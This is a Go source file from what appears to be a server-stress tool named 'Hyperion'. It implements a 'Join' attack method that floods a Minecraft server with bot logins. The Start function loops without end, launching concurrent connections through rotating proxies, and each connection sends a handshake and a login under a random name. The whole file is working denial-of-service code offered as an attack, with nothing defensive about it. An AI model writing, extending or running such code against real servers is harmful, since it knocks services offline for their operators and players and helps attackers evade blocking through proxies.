package methods

import (
	"Hyperion/core"
	"Hyperion/core/proxy"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
	"Hyperion/utils"
	"time"
)

type Join struct{}

var shouldRun = false

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start(info *core.AttackInfo, proxyManager *proxy.ProxyManager) {
	shouldRun = true
	for shouldRun {
		for i := 0; i < info.PerDelay; i++ {
			go connect(info, proxyManager.GetNext())
		}
		time.Sleep(info.Delay)
	}
}

func connect(info *core.AttackInfo, proxy *proxy.Proxy) {
	conn, err := mc.DialMC(info.Ip, info.Port, proxy)
	if err != nil {
		return
	}
	mcutils.WriteHandshake(conn, info.Ip, info.Port, info.Protocol, mcutils.Login)
	mcutils.WriteLoginPacket(conn, utils.RandomName(16), false, nil)
}

func (join Join) Stop() {
	shouldRun = false
}
